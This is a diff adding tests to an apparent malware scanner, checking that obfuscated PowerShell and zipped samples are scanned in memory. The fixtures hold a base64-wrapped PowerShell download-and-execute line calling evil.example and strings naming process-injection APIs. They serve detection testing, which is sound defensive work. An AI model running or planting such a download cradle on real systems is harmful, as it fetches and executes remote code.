@@ -284,3 +284,41 @@ def test_carver_macho_and_ole_signatures(tmp_path):
     titles = [t.title for t in Carver().analyze(ctx)]
     assert any("Mach-O executable" in t for t in titles)
     assert any("OLE/MSI compound file" in t for t in titles)
+
+
+def test_in_memory_scan_writes_no_payload_to_disk(tmp_path):
+    # Nested re-scans (deobfuscated stages, archive members) must analyse the
+    # recovered payload IN MEMORY - never writing it to disk - so an on-access
+    # EDR (e.g. CrowdStrike) cannot quarantine it and abort the scan.
+    import base64
+    import glob
+    import os
+    import tempfile
+    import zipfile
+
+    troot = tempfile.gettempdir()
+    before = set(glob.glob(os.path.join(troot, "hawkscan_*")))
+
+    hidden = (b"powershell -w hidden -enc x; IEX (New-Object "
+              b"Net.WebClient).DownloadString('http://evil.example/p.ps1')")
+    wrapper = f"# helper\n$d='{base64.b64encode(hidden).decode()}'\n".encode()
+    r1 = _scan(tmp_path, "w.ps1", wrapper)
+    assert any(f.analyzer == "deobfuscate" for f in r1.findings)
+
+    z = tmp_path / "a.zip"
+    with zipfile.ZipFile(z, "w") as zf:
+        zf.writestr("invoice.exe", b"MZ VirtualAllocEx WriteProcessMemory "
+                                   b"CreateRemoteThread SetThreadContext "
+                                   b"NtUnmapViewOfSection")
+    assert any("Archived member" in f.title for f in ENGINE.scan(z).findings)
+
+    after = set(glob.glob(os.path.join(troot, "hawkscan_*")))
+    assert after == before, f"payload temp dirs leaked: {after - before}"
+
+
+def test_scan_bytes_detects_in_memory(tmp_path):
+    inj = (b"MZ VirtualAllocEx WriteProcessMemory CreateRemoteThread "
+           b"SetThreadContext NtUnmapViewOfSection")
+    res = ENGINE.scan_bytes(inj, name="x.bin")
+    assert res.info.data.get("in_memory") is True
+    assert res.findings  # produced findings without touching disk
